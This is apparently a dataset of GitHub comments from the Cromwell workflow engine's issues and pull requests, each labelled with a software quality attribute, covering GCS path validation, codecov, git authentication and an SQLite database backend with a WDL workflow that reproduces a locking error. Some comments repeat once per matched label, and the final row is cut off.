https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906:63,Testability,test,tests,63,"FYI- @cjllanwarne / @mcovarr: After working with the `GcsPath` tests I'm backing away from trying to figure out if a `GcsPath` is ""valid"" if it's a bucket only. Path-theory is just too complex to think about right now. Happy to give examples IRL, but mindbenders include:. - `""gs://bucket/""`; - `""gs://bucket""`; - `""gs://bucket/.""`; - `""gs://bucket/ ""`; - etc. I'll leave the validation in `GcsBatchIoCommand` though, ensuring we never issue requests to `list` instead of `get` objects.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719639906
https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719663718:404,Modifiability,config,config,404,"🤔. After looking at things like `GcsBatchIsDirectoryCommand` that does accept blobs without paths, FYI my approach to `develop` may be different. I think this band-aid for a very specific known case **might be** fine for 53, but my `develop` PR will likely label ""`BlobId` instances that allowed to have no object"" vs. ""`BlobId` instances that represents a pseudo directory, like `backend.providers.Papi.config.root = ""gs://kshakir-dsde-cromwell-dev""`""",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6002#issuecomment-719663718
https://github.com/broadinstitute/cromwell/pull/6006#issuecomment-722575506:61,Deployability,hotfix,hotfix,61,Per standup 2020-11-05 we're not going to bother with the 53 hotfix version of #6007 since 54 is imminent-ish.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6006#issuecomment-722575506
https://github.com/broadinstitute/cromwell/issues/6014#issuecomment-1814224479:200,Deployability,release,release,200,"Same here.; This effects running picard intervallisttools with the scatter command for example. Might be os depent or cromwell version depent. affects cromwell 56 running with java 11 on CentOS Linux release 7.9.2009. lazy workaround is something like this:. ```bash; FILEINDEX=0; for FILE in ./scatter_list/*/*.interval_list; do; mv ""$FILE"" ""$(dirname $FILE)""""/""""$FILEINDEX""""_""""$(basename $FILE)""; FILEINDEX=$((FILEINDEX+1)); done; ```; ----. update also affects cromwell 79 running with java(openjdk) 11 on CentOS Linux release 7.9.2009",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6014#issuecomment-1814224479
https://github.com/broadinstitute/cromwell/issues/6014#issuecomment-1814224479:444,Deployability,update,update,444,"Same here.; This effects running picard intervallisttools with the scatter command for example. Might be os depent or cromwell version depent. affects cromwell 56 running with java 11 on CentOS Linux release 7.9.2009. lazy workaround is something like this:. ```bash; FILEINDEX=0; for FILE in ./scatter_list/*/*.interval_list; do; mv ""$FILE"" ""$(dirname $FILE)""""/""""$FILEINDEX""""_""""$(basename $FILE)""; FILEINDEX=$((FILEINDEX+1)); done; ```; ----. update also affects cromwell 79 running with java(openjdk) 11 on CentOS Linux release 7.9.2009",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6014#issuecomment-1814224479
https://github.com/broadinstitute/cromwell/issues/6014#issuecomment-1814224479:522,Deployability,release,release,522,"Same here.; This effects running picard intervallisttools with the scatter command for example. Might be os depent or cromwell version depent. affects cromwell 56 running with java 11 on CentOS Linux release 7.9.2009. lazy workaround is something like this:. ```bash; FILEINDEX=0; for FILE in ./scatter_list/*/*.interval_list; do; mv ""$FILE"" ""$(dirname $FILE)""""/""""$FILEINDEX""""_""""$(basename $FILE)""; FILEINDEX=$((FILEINDEX+1)); done; ```; ----. update also affects cromwell 79 running with java(openjdk) 11 on CentOS Linux release 7.9.2009",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6014#issuecomment-1814224479
https://github.com/broadinstitute/cromwell/pull/6020#issuecomment-722554011:90,Deployability,deploy,deployed,90,"This Cromwell PR accompanies https://github.com/broadinstitute/martha/pull/197 but can be deployed independently. Since DRS is no-longer W3C URI compatible, this PR no longer tries to use `java.net.URI` to check for valid values and instead just forwards on whatever opaque `dos://` or `drs://` strings to `martha_v3`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6020#issuecomment-722554011
https://github.com/broadinstitute/cromwell/pull/6022#issuecomment-723262670:7,Deployability,update,updated,7,"I only updated test code, so I'm ignoring codecov's complaint as I have no idea what it's talking about.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6022#issuecomment-723262670
https://github.com/broadinstitute/cromwell/pull/6022#issuecomment-723262670:15,Testability,test,test,15,"I only updated test code, so I'm ignoring codecov's complaint as I have no idea what it's talking about.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6022#issuecomment-723262670
https://github.com/broadinstitute/cromwell/pull/6034#issuecomment-724178088:69,Testability,test,test,69,Closing PR because I want to work on getting a Dummy backend centaur test case too,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6034#issuecomment-724178088
https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007:125,Deployability,configurat,configuration,125,"Ignoring codecov because there are some ""in case they're useful"" implementations here that aren't activated without specific configuration and not going to be used in anything other than manual testing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007
https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007:125,Modifiability,config,configuration,125,"Ignoring codecov because there are some ""in case they're useful"" implementations here that aren't activated without specific configuration and not going to be used in anything other than manual testing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007
https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007:194,Testability,test,testing,194,"Ignoring codecov because there are some ""in case they're useful"" implementations here that aren't activated without specific configuration and not going to be used in anything other than manual testing.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6047#issuecomment-736664007
https://github.com/broadinstitute/cromwell/pull/6052#issuecomment-729022423:111,Testability,test,test,111,Could you add a little commentary?. Eg why is it ok to remove the actor system name in (eg) `dockerHashing/src/test/scala/cromwell/docker/DockerEmptyFlowSpec.scala` and not replace it with a named actor instead?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6052#issuecomment-729022423
https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760530070:117,Security,Authenticat,Authentication,117,"@aednichols When I tried creating a branch in broadinstitute/cromwell as suggested by you in #5807, I get . > fatal: Authentication failed for 'https://github.com/broadinstitute/cromwell.git/' . I did _git push mainRepo EFS-fixes-for-5468_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760530070
https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760536657:212,Security,authenticat,authentication,212,@nvanaja I re-verified your permissions and they look right. I am noticing that Git is using `https://github.com/broadinstitute/cromwell.git/'` as the remote; using an HTTPS remote does not use your SSH keys for authentication and could be causing the problem. I always recommend SSH remotes e.g. `git@github.com:broadinstitute/cromwell.git`,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6058#issuecomment-760536657
https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-731197096:71,Energy Efficiency,reduce,reduced,71,Does anyone know what is wrong with codecov? My changes shouldn't have reduced test coverage that much.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-731197096
https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-731197096:79,Testability,test,test,79,Does anyone know what is wrong with codecov? My changes shouldn't have reduced test coverage that much.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-731197096
https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666:275,Performance,perform,performance,275,"Hi @cjllanwarne ; 1. I'm not an expert in databases, so I'm not sure. In my opinion, it may become even better, because in case of hundreds excluded ids we can filter them out before expensive joins or other filtrations. I'll try to do something to check that it won't cause performance penalties.; 2. I tried to find a way to test it, but it is very tricky to me. I was hoping you will give me some hint on how to do it :); 3. Will do",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666
https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666:327,Testability,test,test,327,"Hi @cjllanwarne ; 1. I'm not an expert in databases, so I'm not sure. In my opinion, it may become even better, because in case of hundreds excluded ids we can filter them out before expensive joins or other filtrations. I'll try to do something to check that it won't cause performance penalties.; 2. I tried to find a way to test it, but it is very tricky to me. I was hoping you will give me some hint on how to do it :); 3. Will do",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6072#issuecomment-745492666
https://github.com/broadinstitute/cromwell/issues/6076#issuecomment-794307595:117,Modifiability,config,config,117,"Hello and thanks for the issue. Server mode does not accept command line arguments, rather its behavior is driven by config file. When printing the command line help, the CLI args should be indented under the `Command: run [options] workflow-source` heading. For more information on persisting metadata in a database with server mode, please see https://cromwell.readthedocs.io/en/stable/Configuring/#database",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6076#issuecomment-794307595
https://github.com/broadinstitute/cromwell/issues/6076#issuecomment-794307595:388,Modifiability,Config,Configuring,388,"Hello and thanks for the issue. Server mode does not accept command line arguments, rather its behavior is driven by config file. When printing the command line help, the CLI args should be indented under the `Command: run [options] workflow-source` heading. For more information on persisting metadata in a database with server mode, please see https://cromwell.readthedocs.io/en/stable/Configuring/#database",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6076#issuecomment-794307595
https://github.com/broadinstitute/cromwell/pull/6081#issuecomment-745480676:54,Testability,test,tests,54,Hi @cjllanwarne; Thanks for your review! I'll add new tests and notify you when I'm done.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6081#issuecomment-745480676
https://github.com/broadinstitute/cromwell/pull/6089#issuecomment-777656264:56,Security,access,access,56,Going with CircleCI instead because it gives us full VM access instead of starting us off in a container and forcing docker-by-docker or docker-in-docker solutions,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6089#issuecomment-777656264
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-733930860:189,Testability,test,test,189,> Could we replace HSQL with SQLite so that we can aren't maintaining two embedded database implementations?. Created BT-56 to track the issue and steps to getting there. TL;DR we don't CI test the embedded DB with real WDLs so I'd be hesitant to change to SQLite until we can know before users if/when we break it.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-733930860
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734691039:111,Deployability,pipeline,pipelines,111,"Wow! Thanks @kshakir! This is great news! Thanks for putting your effort in this! ; I think I will start a few pipelines to see the effect on memory usage and storage space and compare that with HSQLdb. @aednichols ; > It seems that SQLite is a superset of what is supported by HSQL. It is also very broadly popular. > Could we replace HSQL with SQLite so that we can aren't maintaining two embedded database implementations?. Replacing HSQL with SQLite and making SQLite default has multiple advantages:; - HSQL uses a lot of memory for the in-memory database. SQLite is probably more efficient (testing required); - With SQLite a file-based database could be enabled by default (in `<<CROMWELL_ROOT>>/cromwell-db.sqlite`) which would enable call-caching by default for people using it from the command line with the run command.; - If the filebased database is enabled by default, there is no need for most users to get into the details of getting a proper database server running. However HSQL has the advantage that it is very well supported by slick and other java/scala practice (HSQL is itself written in Java) and that it requires minimal code to get it working. By contrast SQLite needs more code as shown in this PR. It is thus more costly to support SQLite.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734691039
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734691039:586,Energy Efficiency,efficient,efficient,586,"Wow! Thanks @kshakir! This is great news! Thanks for putting your effort in this! ; I think I will start a few pipelines to see the effect on memory usage and storage space and compare that with HSQLdb. @aednichols ; > It seems that SQLite is a superset of what is supported by HSQL. It is also very broadly popular. > Could we replace HSQL with SQLite so that we can aren't maintaining two embedded database implementations?. Replacing HSQL with SQLite and making SQLite default has multiple advantages:; - HSQL uses a lot of memory for the in-memory database. SQLite is probably more efficient (testing required); - With SQLite a file-based database could be enabled by default (in `<<CROMWELL_ROOT>>/cromwell-db.sqlite`) which would enable call-caching by default for people using it from the command line with the run command.; - If the filebased database is enabled by default, there is no need for most users to get into the details of getting a proper database server running. However HSQL has the advantage that it is very well supported by slick and other java/scala practice (HSQL is itself written in Java) and that it requires minimal code to get it working. By contrast SQLite needs more code as shown in this PR. It is thus more costly to support SQLite.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734691039
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734691039:597,Testability,test,testing,597,"Wow! Thanks @kshakir! This is great news! Thanks for putting your effort in this! ; I think I will start a few pipelines to see the effect on memory usage and storage space and compare that with HSQLdb. @aednichols ; > It seems that SQLite is a superset of what is supported by HSQL. It is also very broadly popular. > Could we replace HSQL with SQLite so that we can aren't maintaining two embedded database implementations?. Replacing HSQL with SQLite and making SQLite default has multiple advantages:; - HSQL uses a lot of memory for the in-memory database. SQLite is probably more efficient (testing required); - With SQLite a file-based database could be enabled by default (in `<<CROMWELL_ROOT>>/cromwell-db.sqlite`) which would enable call-caching by default for people using it from the command line with the run command.; - If the filebased database is enabled by default, there is no need for most users to get into the details of getting a proper database server running. However HSQL has the advantage that it is very well supported by slick and other java/scala practice (HSQL is itself written in Java) and that it requires minimal code to get it working. By contrast SQLite needs more code as shown in this PR. It is thus more costly to support SQLite.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734691039
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:87,Availability,error,errors,87,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:96,Availability,Failure,Failure,96,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:645,Availability,echo,echo,645,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:1235,Availability,ERROR,ERROR,1235,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:1652,Availability,Failure,Failure,1652,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:794,Modifiability,config,config,794,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:120,Performance,cache,cache,120,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:1676,Performance,cache,cache,1676,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] 